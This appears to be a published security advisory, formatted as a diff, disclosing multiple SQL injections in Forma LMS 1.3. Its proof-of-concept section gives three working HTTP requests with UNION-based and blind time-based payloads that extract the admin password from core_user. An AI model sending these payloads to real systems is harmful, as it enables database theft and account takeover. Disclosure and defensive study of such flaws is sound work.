@@ -1,0 +1,71 @@
+Forma LMS 1.3 Multiple SQL Injections
+
+[+] Author: Filippo Roncari
+[+] Target: Forma LMS 
+[+] Version: 1.3 and probably lower
+[+] Vendor: http://www.formalms.org
+[+] Accessibility: Remote
+[+] Severity: High
+[+] CVE: <requested>
+[+] Full Advisory: https://www.securenetwork.it/docs/advisory/SN-15-03_Formalms.pdf
+[+] Info: f.roncari@securenetwork.it / f@unsec.it
+
+
+[+] Summary
+Forma LMS is a corporate oriented Learning Management System, used to manage and deliver online training courses. Forma LMS is SCORM compliant with enterprise class features like multi-client architecture, custom report generation, native ecommerce and catalogue management, integration API, and more.
+
+
+[+] Vulnerability Details
+Forma LMS 1.3 is prone to multiple SQL injections vulnerabilities, which allow unprivileged users to inject arbitrary SQL statements.
+An attacker could exploit these vulnerabilities by sending crafted requests to the web application. These issues can lead to data theft, data disruption, account violation and other attacks depending on the DBMS’s user privileges.
+
+
+[+] Technical Details
+See full advisory at https://www.securenetwork.it/docs/advisory/SN-15-03_Formalms.pdf for technical details and source code.
+
+
+[+] Proof of Concept (PoC)
+Unprivileged users such as Student or Professors could exploit these issues.
+In reported payload "idst" SQL param is equal to 11836 which was admin's ID in tested installation.
+
+	[!] coursereport.php SQL Injection in title param
+	-------------------------
+	POST /formalms/appLms/index.php?modname=coursereport&op=addscorm HTTP/1.1 Host: localhost
+	Cookie: docebo_session=a6c94fcdfecf0d08b83de03a3c576885
+
+	authentic_request=e1d3c5667856f21f0d09ce4796a76da6&id_report=0&source_of=scoitem&title=null+union+select+pass+fr om+core_user+where+idst=11836+&filtra=Salva+modifiche
+	-------------------------
+
+
+	[!] lib.message.php Blind Time-Based SQL Injection in msg_course_filter param
+	-------------------------
+	POST /formalms/appLms/index.php?modname=message&op=writemessage HTTP/1.1 Host: localhost
+	Cookie: docebo_session=0c0491bb1fa6d814752d9e59c066df60
+
+	[...] 
+
+	------WebKitFormBoundaryu0DCt6tLZt8hAdlH
+	Content-Disposition: form-data; name="msg_course_filter"
+
+	99999 union SELECT IF(SUBSTRING(pass,1,1) = char(100),benchmark(5000000,encode(1,2)),null) from core_user
+	where idst=11836
+
+	[...]
+	------------------------
+
+
+	[!] coursereport.php SQL Injection in id_source param
+	-------------------------
+	POST /formalms/appLms/index.php?modname=coursereport&op=addscorm HTTP/1.1
+	Host: localhost
+	Cookie: docebo_session=a6c94fcdfecf0d08b83de03a3c576885; SQLiteManager_currentLangue=2
+
+	authentic_request=e1d3c5667856f21f0d09ce4796a76da6&id_report=0&weight=123&show_to_user=true&use_for_final=true&tit le=&source_of=scoitem&titolo=&id_source=null+union+select+null,null,null,null,null,null,null,null,null,null,null,null,null,p ass,null,null,null+from+core_user+where+idst=11836&save=Salva+modifiche
+	-------------------------
+
+
+For further details and explanations check the full advisory.
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.	
